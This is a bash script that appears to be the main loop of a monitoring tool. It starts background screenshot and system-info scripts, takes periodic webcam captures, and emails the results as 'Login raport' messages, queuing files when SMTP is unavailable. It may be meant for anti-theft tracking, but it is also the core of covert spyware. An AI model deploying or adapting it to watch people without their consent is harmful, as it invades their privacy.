source function.sh
function check_connection {
#return 0 # if connection false
CONNECTION_MODE=1
}

function check_smtp {
#return 0 # if connection false
DATA=`date +"%Y-%m-%d-%H-%M-%S"`
touch check.zip
echo "d">>check.zip
fsendemail "Login raport - $COMP_ID - $DATA" "Test mesage to verify SMTP cappabilities." "check.zip"
if [[ $RESP == *"Email was sent successfully!" ]]
then
	CONNECTION_SMTP=1
else
	CONNECTION_SMTP=0
fi
rm check.zip
}

CONNECTION_MODE=0 # 0-no connection; 1-connection
SMTP=0

T_INITIAL_DELAY=20
T_CHECK_STATUS=120
T_SMTP_CHECK_EVERY=20 # Check every n passes of status check
T_INF_CHECK=900
T_SCREEN_CHECK=300
T_CAM_DELAY=60
T_CAM_EVERY=8
SMTP_COUNTER=0
CAM_COUNTER=0
CAM_FIRST=0

sleep $T_INITIAL_DELAY

./inf.sh $T_INF_CHECK &
./screenshot.sh $T_SCREEN_CHECK &

check_smtp

while true
do
	check_connection

	SMTP_COUNTER=$(($SMTP_COUNTER+1))
	if [ $((SMTP_COUNTER)) -ge $((T_SMTP_CHECK_EVERY)) ]
	then
		SMTP_COUNTER=0
		check_smtp
	fi
	if [ $CONNECTION_SMTP -eq "0" ]
	then
		# If we didn't established smtp connection, we will check at next loop.
		SMTP_COUNTER=$T_SMTP_CHECK_EVERY
	fi
	
	CAM_COUNTER=$(($CAM_COUNTER+1))
	if [[ $CONNECTION_MODE -eq "1" ]] && [[ $CONNECTION_SMTP -eq "1" ]]
	then
		if [ $((CAM_FIRST)) -ge $((1)) ]
		then
			if [ $((CAM_COUNTER)) -ge $((T_CAM_EVERY)) ]
			then
				./camera.sh $T_CAM_DELAY 0 &
				CAM_COUNTER=0
			fi
		else
			CAM_FIRST=1
			./camera.sh 0 1
		fi
		./send_later.sh
	else
		# When no smtp or connection was established
		if [ $((CAM_COUNTER)) -ge $((T_CAM_EVERY)) ]
		then
			./camera.sh $T_CAM_DELAY 0 &
			CAM_COUNTER=0
		fi
	fi
	DIRSIZE=`du -s tosendlater/ | cut -f 1`
	if [ $DIRSIZE -ge 2000000 ]
	then
		dirD='tosendlater'
		file=`/bin/ls -1 "$dirD" | sort --random-sort | head -1`
		path=`readlink --canonicalize "$dirD/$file"` # Converts to full path
		rm "$path"
	fi

	sleep $T_CHECK_STATUS
done
